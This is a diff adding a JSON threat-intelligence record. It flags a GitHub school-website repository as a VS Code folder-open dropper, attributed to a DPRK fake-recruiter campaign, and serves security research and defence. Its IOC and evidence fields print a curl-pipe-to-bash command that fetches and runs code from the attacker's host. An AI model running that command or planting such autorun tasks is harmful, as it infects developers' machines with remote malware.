@@ -1,0 +1,72 @@
+{
+  "finding": {
+    "key": "repository:kreliannn/school-website-bootsrap",
+    "kind": "repository",
+    "family": "",
+    "id": "kreliannn/school-website-bootsrap",
+    "url": "https://github.com/Kreliannn/school-website-bootsrap",
+    "registry": "github",
+    "owner": "kreliannn",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 5,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "GW-C-498a0aeb",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0; PCNL BYRON/.vscode/tasks.json:0",
+    "c2_hosts": "default-configuration.vercel.app",
+    "iocs": "default-configuration.vercel.app; https://default-configuration.vercel.app/settings/linux?flag=9-test; curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "repository under owner Kreliannn of a known-malicious repo | Tier-2 confirmed (bash score 5)",
+    "osm_status": "submitted",
+    "osm_threat_id": "31215c83-e708-482e-82df-89fbb22c3f46",
+    "first_seen": "hunt-20260702T051729Z",
+    "last_seen": "hunt-20260702T051729Z",
+    "evidence_file": "repositories/kreliannn_school-website-bootsrap.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    },
+    {
+      "file": "PCNL BYRON/.vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash curl https://default-configuration.vercel.app/settings/linux?flag=9-test | sh curl https://default-configuration.vercel."
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/kreliannn/school-website-bootsrap",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json, PCNL BYRON/.vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, PCNL BYRON/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nThe same dropper is planted in 2 directories.\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: default-configuration.vercel.app.\nCampaign GW-C-498a0aeb: one of 89 confirmed repos across 14 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 3 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, vscode-extension-260120.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: default-configuration.vercel.app.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json, PCNL BYRON/.vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from default-configuration.vercel.app and executes it (.vscode/tasks.json, PCNL BYRON/.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed (+1 more)\n- Attacker hosts: default-configuration.vercel.app",
+    "publisher": "kreliannn",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "polinrider",
+      "contagious-interview",
+      "fake-recruiter",
+      "dprk",
+      "north-korea",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/kreliannn/school-website-bootsrap/blob/HEAD/.vscode/tasks.json\nhttps://github.com/kreliannn/school-website-bootsrap/blob/HEAD/PCNL BYRON/.vscode/tasks.json",
+    "verified_iocs": "default-configuration.vercel.app\nhttps://default-configuration.vercel.app/settings/linux?flag=9-test\ncurl https://default-configuration.vercel.app/settings/linux?flag=9-test | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-02T05:17:29Z",
+    "last_seen": "2026-07-02T05:17:29Z"
+  }
+}
